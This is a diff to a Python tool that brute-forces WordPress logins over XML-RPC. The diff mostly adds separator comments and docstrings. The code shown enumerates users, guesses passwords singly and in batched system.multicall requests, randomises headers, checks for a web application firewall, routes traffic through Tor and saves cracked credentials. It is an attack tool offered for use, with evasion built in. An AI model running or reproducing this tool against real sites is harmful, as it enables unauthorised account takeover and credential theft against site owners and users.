@@ -29,14 +29,18 @@ logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
+# ==================================================================================================
 
 def print_colored_bold(text, color=Fore.GREEN):
     print(colored(text, color, attrs=["bold"]))
 
+# ==================================================================================================
 
 def generate_random_ip():
     return ".".join(str(random.randint(1, 255)) for _ in range(4))
 
+# ==================================================================================================
+# ==================================================================================================
 
 def generate_random_headers(target_url):
     user_agents = [
@@ -106,6 +110,9 @@ def generate_random_headers(target_url):
 
     return headers
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def check_xmlrpc_available(url, session, retries=3, delay=2):
     headers = generate_random_headers(url)
@@ -230,6 +237,9 @@ async def check_xmlrpc_available(url, session, retries=3, delay=2):
     
     return False
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def get_wp_users(url, session):
     headers = generate_random_headers(url)
@@ -246,6 +256,9 @@ async def get_wp_users(url, session):
         logging.error(f"Error fetching users: {e}")
         return []
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def brute_force_login(url, username, password, session):
     headers = generate_random_headers(url)
@@ -274,6 +287,9 @@ async def brute_force_login(url, username, password, session):
         logging.error(f"Error during login attempt for {username}:{password}: {e}")
         return None, None, None
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def exploit_multicall(url, usernames, passwords, session):
     headers = generate_random_headers(url)
@@ -323,11 +339,23 @@ async def exploit_multicall(url, usernames, passwords, session):
         logging.error(f"Error during multicall attempt: {e}")
         return None, None, None
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def analyze_response_times(response_times):
-    # Placeholder for timing attack analysis
+    """
+    Analyze the response times to detect potential timing attacks.
+
+    This function calculates the average and median response times from a list of response times.
+    It also identifies the response with the maximum deviation from the average time, which could
+    indicate a timing attack.
+    """
     if response_times:
+        # Calculate average response time
         average_time = sum(response_times) / len(response_times)
+        
+        # Calculate median response time
         sorted_times = sorted(response_times)
         median_time = (
             sorted_times[len(sorted_times) // 2]
@@ -339,15 +367,20 @@ async def analyze_response_times(response_times):
             / 2
         )
 
+        # Log the average and median response times
         logging.info(f"Average Response Time: {average_time:.4f} seconds")
         logging.info(f"Median Response Time: {median_time:.4f} seconds")
-        # Look for significant time variations in response
+        
+        # Detect significant time variations
         time_deviations = [abs(time - average_time) for time in response_times]
         max_deviation_index = time_deviations.index(max(time_deviations))
         logging.info(
             f"Max deviation detected at response: {max_deviation_index+1}, time: {response_times[max_deviation_index]:.4f}"
         )
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def save_successful_login(username, password):
     try:
@@ -365,6 +398,9 @@ async def save_successful_login(username, password):
             f"Error while writing successful login {username}:{password}: {e}"
         )
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def brute_force_task(
     url,
@@ -398,29 +434,36 @@ async def brute_force_task(
 
     return False
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
+
 async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=False):
     # Initialize start time and total attempts
-    start_time = [time.time()]
-    total_attempts = [0]
-    progress_print_interval = 0.5  # time interval for progress reports
+    start_time = [time.time()]  # List to hold the start time for tracking elapsed time
+    total_attempts = [0]  # List to hold the total number of attempts made
+    progress_print_interval = 0.5  # Time interval in seconds for printing progress reports
 
     # Set up the proxy connector if using Tor
     if use_tor:
+        # Parse the Tor proxy URL
         parsed_url = urlparse("socks5://127.0.0.1:9050")
+        # Create a ProxyConnector for SOCKS5 proxy
         connector = ProxyConnector(
             proxy_type=ProxyType.SOCKS5,
             host=parsed_url.hostname,
             port=parsed_url.port,
         )
     else:
-        connector = None
+        connector = None  # No proxy connector if not using Tor
 
     # Create an aiohttp session with the connector
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
+        tasks = []  # List to hold all the asyncio tasks
         # Create brute force tasks for each username and password combination
         for username in usernames:
             for password in passwords:
+                # Create an asyncio task for each username-password pair
                 task = asyncio.create_task(
                     brute_force_task(
                         url,
@@ -432,11 +475,14 @@ async def start_bruteforce_async(url, usernames, passwords, threads, use_tor=Fal
                         progress_print_interval,
                     )
                 )
-                tasks.append(task)
+                tasks.append(task)  # Add the task to the list
 
         # Run all tasks concurrently
-        await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks)  # Wait for all tasks to complete
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def start_multicall_async(url, usernames, passwords, session, use_tor=False):
     # Attempt to exploit the multicall method
@@ -465,6 +511,9 @@ async def start_multicall_async(url, usernames, passwords, session, use_tor=Fals
         return response_time
     return None
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def check_for_waf(url, session, use_tor=False):
     try:
@@ -488,6 +537,9 @@ async def check_for_waf(url, session, use_tor=False):
         logging.error(f"Error when testing for WAF : {e}")
         return False
 
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def main():
     # Print the banner
@@ -594,6 +646,8 @@ async def main():
         else:
             await start_bruteforce_async(url + "/xmlrpc.php", users, passwords, threads)
 
+# ==================================================================================================
+# ==================================================================================================
 
 if __name__ == "__main__":
     asyncio.run(main())
